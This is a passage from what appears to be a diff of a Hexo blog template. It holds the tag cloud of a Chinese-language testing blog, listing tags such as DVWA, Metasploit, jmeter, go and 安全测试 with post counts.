class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/" rel="tag">性能测试</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" rel="tag">自动化测试</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/" rel="tag">英语学习</a><span class="tag-list-count">1</span></li></ul>
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWVS/" rel="tag">AWVS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burp-Site/" rel="tag">Burp Site</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dependency-Check/" rel="tag">Dependency-Check</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/H5/" rel="tag">H5</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hadoop/" rel="tag">Hadoop</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hive/" rel="tag">Hive</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nessus/" rel="tag">Nessus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sonic/" rel="tag">Sonic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/airtest/" rel="tag">airtest</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/" rel="tag">android性能测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag">app安全测试</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/aritest/" rel="tag">aritest</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos/" rel="tag">centos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome/" rel="tag">chrome</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/datax/" rel="tag">datax</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/drozer/" rel="tag">drozer</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fisco-bcos/" rel="tag">fisco-bcos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flink/" rel="tag">flink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gin/" rel="tag">gin</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/" rel="tag">go</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go-zero/" rel="tag">go-zero</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hive/" rel="tag">hive</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/httprunner/" rel="tag">httprunner</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jmeter/" rel="tag">jmeter</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/" rel="tag">kafka</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kail/" rel="tag">kail</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode-%E6%95%B0%E7%BB%84/" rel="tag">leetcode-数组</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mitmproxy/" rel="tag">mitmproxy</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/" rel="tag">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/monkey/" rel="tag">monkey</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pandas/" rel="tag">pandas</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pc%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag">pc自动化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/playwright/" rel="tag">playwright</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pytest/" rel="tag">pytest</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">23</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selenium/" rel="tag">selenium</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlite/" rel="tag">sqlite</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tkinter/" rel="tag">tkinter</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue/" rel="tag">vue</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue3/" rel="tag">vue3</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">云服务器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/" rel="tag">大数据</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag">安全测试</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/" rel="tag">性能测试</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" rel="tag">自动化测试</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/" rel="tag">英语学习</a><span class="tag-list-count">1</span></li></ul>
         </canvas>
     </div>
 </div>
